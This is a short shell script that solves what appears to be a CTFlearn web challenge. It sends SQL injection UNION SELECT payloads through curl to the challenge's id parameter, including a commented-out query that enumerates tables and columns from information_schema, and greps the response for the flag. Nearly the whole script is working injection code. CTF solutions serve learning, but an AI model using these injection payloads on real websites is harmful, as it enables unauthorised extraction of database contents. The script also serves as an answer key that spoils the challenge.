#!/bin/sh

endpoint='http://web.ctflearn.com/web8/'

# from_table='FROM information_schema.columns WHERE table_schema = DATABASE()'
# payload="table_name, column_name, 1, 2 $from_table"

payload='f0und_m3, 1, 2, 3 FROM w0w_y0u_f0und_m3'

curl -sL "$endpoint?id=1 UNION SELECT $payload" | grep -io abc.*{.*}
